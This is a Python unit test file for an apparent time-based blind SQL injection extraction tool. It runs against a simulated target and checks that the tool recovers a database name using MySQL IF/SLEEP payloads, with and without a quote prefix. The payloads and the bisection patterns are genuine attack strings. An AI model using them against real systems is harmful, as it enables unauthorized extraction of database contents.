# -*- coding: utf-8 -*-
"""模板复用端到端单元测试：无引号语境下 extract_scalar 真的用确认 payload 读取。

运行：venv/Scripts/python tests/test_blind_reuse_flow.py

用假客户端模拟「SQL 执行 SLEEP」：条件成立 → 2s，不成立 → 0.01s。
断言提取出的库名正确，且所有 payload 都沿用确认形态（无引号），不另外加 ' 或 "。
"""
import re
import sys
from pathlib import Path
from types import SimpleNamespace

sys.stdout.reconfigure(encoding="utf-8", errors="replace")
sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

import app.models  # noqa: F401
from app.services.blind_extract import _Prober, build_payload, reuse_template

passed, failed = [], []


def check(name, cond, extra=""):
    (passed if cond else failed).append(name)
    print(f"{'OK' if cond else 'FAIL'} {name} {extra}")


DB_NAME = "sql_injection_lab"
_SLEEP_RE = re.compile(r"sleep\((\d+(?:\.\d+)?)\)", re.I)
_LEN_RE = re.compile(r"length\(\(database\(\)\)\)>(\d+)", re.I)
_CHAR_RE = re.compile(
    r"ascii\(substring\(\(database\(\)\),(\d+),1\)\)>(\d+)", re.I)


class FakeClient:
    """模拟目标：把 payload 里的条件在本地求值，成立就返回 sleep 时长。"""

    def __init__(self, db_name=DB_NAME):
        self.db_name = db_name
        self.last_elapsed = 0.0
        self.payloads = []

    def request(self, method, url, params=None, data=None, payload=None):
        self.payloads.append(payload or "")
        cond = payload or ""
        slow = False
        m = _LEN_RE.search(cond)
        if m:
            slow = len(self.db_name) > int(m.group(1))
        m = _CHAR_RE.search(cond)
        if m:
            i, mid = int(m.group(1)), int(m.group(2))
            ch = self.db_name[i - 1] if 0 < i <= len(self.db_name) else ""
            slow = bool(ch) and ord(ch) > mid
        sm = _SLEEP_RE.search(cond)
        self.last_elapsed = float(sm.group(1)) if (slow and sm) else 0.01
        return SimpleNamespace(status_code=200, text="ok")


def _endpoint():
    return SimpleNamespace(
        method="GET", host="target.local", scheme="http",
        path="/check", raw_path="/check",
        params=[{"name": "id", "location": "query", "type": "string",
                 "sample_value": "1"}])


def _run_extract(hint):
    cli = FakeClient()
    builder = lambda c: reuse_template(hint, c, 2, "mysql")  # noqa: E731
    p = _Prober(cli, _endpoint(), "id", "1", "mysql", sec=2, builder=builder)
    value = p.extract_string("database()", max_len=32)
    return cli, value, p


def test_no_quote_extraction():
    hint = "1 and if(1=1,sleep(3),1)-- -"
    cli, value, p = _run_extract(hint)
    check("无引号语境提取正确", value == DB_NAME, f"value={value!r}")
    check("未报错", not p.error, str(p.error))
    injected = [pl for pl in cli.payloads if "if(" in pl]
    check("payload 沿用确认形态（无引号）",
          bool(injected) and all("1 and if((" in pl and not pl.startswith("1'")
                                 and not pl.startswith('1"') for pl in injected),
          injected[0] if injected else "")


def test_quoted_extraction_unchanged():
    hint = "1' and if(1=1,sleep(3),1)-- -"
    cli, value, p = _run_extract(hint)
    check("单引号语境提取正确", value == DB_NAME, f"value={value!r}")
    injected = [pl for pl in cli.payloads if "if(" in pl]
    check("单引号前缀保留",
          bool(injected) and all(pl.startswith("1' and if((") for pl in injected),
          injected[0] if injected else "")


def test_build_payload_empty_quote():
    got = build_payload("1", "1=1", "mysql", quote="", sec=2)
    check("规则兜底支持空引号（数字型）",
          got == "1 AND IF((1=1), SLEEP(2), 0)-- -", repr(got))


def main():
    test_no_quote_extraction()
    test_quoted_extraction_unchanged()
    test_build_payload_empty_quote()
    print(f"\n通过 {len(passed)}，失败 {len(failed)}")
    if failed:
        print("失败项：", failed)
        sys.exit(1)


if __name__ == "__main__":
    main()
